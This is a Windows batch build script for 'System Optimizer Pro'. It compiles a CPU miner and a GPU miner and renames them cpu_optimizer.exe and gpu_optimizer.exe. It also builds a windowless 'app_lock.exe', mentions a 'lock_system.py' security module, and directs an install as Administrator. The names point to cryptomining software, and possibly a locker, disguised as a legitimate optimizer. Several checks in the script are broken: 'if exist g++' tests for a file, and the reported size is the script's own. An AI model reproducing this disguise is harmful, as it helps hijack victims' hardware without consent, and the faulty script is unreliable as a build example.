@echo off
title Building System Optimizer Pro
color 0A

echo ===========================================
echo     BUILDING SYSTEM OPTIMIZER PRO
echo ===========================================
echo.

REM Check for compilers
echo [INFO] Checking build environment...

REM Check C++ compiler
where g++ >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] C++ compiler found: g++
) else (
    echo [WARNING] C++ compiler not found
    echo [INFO] Install MinGW or Visual C++ Build Tools
)

REM Check Rust compiler
where cargo >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Rust compiler found
) else (
    echo [WARNING] Rust compiler not found
    echo [INFO] Install Rust from https://rustup.rs/
)

echo.
echo [1/3] Building main application (C++)...
echo.

REM Build C++ application
if exist g++ (
    g++ app.cpp -o app_lock.exe -static -lwinmm -lgdi32 -O2 -mwindows
    if exist app_lock.exe (
        echo [SUCCESS] app_lock.exe built successfully
        echo [INFO] Size: %~z0 bytes
    ) else (
        echo [ERROR] Failed to build C++ application
    )
)

echo.
echo [2/3] Building CPU optimizer (Rust)...
echo.

REM Build Rust application
if exist cargo (
    cd cpu_miner
    cargo build --release
    if exist target\release\cpu_miner.exe (
        copy target\release\cpu_miner.exe ..\cpu_optimizer.exe
        echo [SUCCESS] CPU optimizer built successfully
    )
    cd ..
)

echo.
echo [3/3] Building GPU optimizer (C++)...
echo.

REM Build GPU miner
if exist g++ (
    g++ gpu_miner.cpp -o gpu_optimizer.exe -static -ld3d11 -ld3dcompiler -O2
    if exist gpu_optimizer.exe (
        echo [SUCCESS] GPU optimizer built successfully
    )
)

echo.
echo ===========================================
echo          BUILD SUMMARY
echo ===========================================
echo.

dir *.exe

echo.
echo [INFO] Files built:
if exist app_lock.exe (
    echo - app_lock.exe (Main application)
)
if exist cpu_optimizer.exe (
    echo - cpu_optimizer.exe (CPU performance)
)
if exist gpu_optimizer.exe (
    echo - gpu_optimizer.exe (GPU performance)
)
if exist lock_system.py (
    echo - lock_system.py (Security module)
)

echo.
echo [INFO] To install: Run install.bat as Administrator
echo [INFO] To test: Run app_lock.exe
echo.
echo ===========================================
echo     BUILD COMPLETE - READY FOR DEPLOYMENT
echo ===========================================
echo.

pause